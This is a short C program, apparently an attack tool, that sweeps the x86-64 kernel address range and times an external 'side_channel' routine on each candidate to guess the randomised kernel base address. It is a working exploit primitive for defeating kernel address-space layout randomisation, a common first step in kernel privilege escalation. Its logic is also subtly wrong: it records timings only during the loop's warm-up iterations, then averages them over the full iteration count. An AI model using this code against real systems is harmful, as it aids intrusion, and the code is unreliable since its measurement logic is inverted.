#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>

#define STEP (0x1000 * 0x100)
#define KERNEL_BASE_START  (0xffffffff80000000)
#define KERNEL_BASE_END (0xffffffffffffffff)
#define RANGE_SIZE (KERNEL_BASE_END - KERNEL_BASE_START) / STEP
#define ITER 250

extern uint64_t side_channel(uintptr_t address);

int main(void) {
    uint64_t times[RANGE_SIZE] = {0};
    uintptr_t addresses[RANGE_SIZE] = {0};

    for (size_t i = 0; i < ITER + 5; i++) {
        for (size_t idx = 0; idx < RANGE_SIZE; idx++) {
            getpid(); // Doing a system call improves the chances of getting the kernel base
            addresses[idx] = KERNEL_BASE_START + idx * STEP;
            // This is a warm up before we actually start recording things
            if (i <= 5) {
                times[idx] += side_channel(addresses[idx]);
            }
        }
    }

    uint64_t minimum_time = (uint64_t)-1;
    uintptr_t most_likely_kernel_base = 0;

    for (size_t i = 0; i < RANGE_SIZE; i++) {
        if (minimum_time > times[i] / ITER) {
            minimum_time = times[i] / ITER;
            most_likely_kernel_base = addresses[i];
        }
    }

    printf("Kernel base most likely to be: %p\n", most_likely_kernel_base);
    return 0;
}
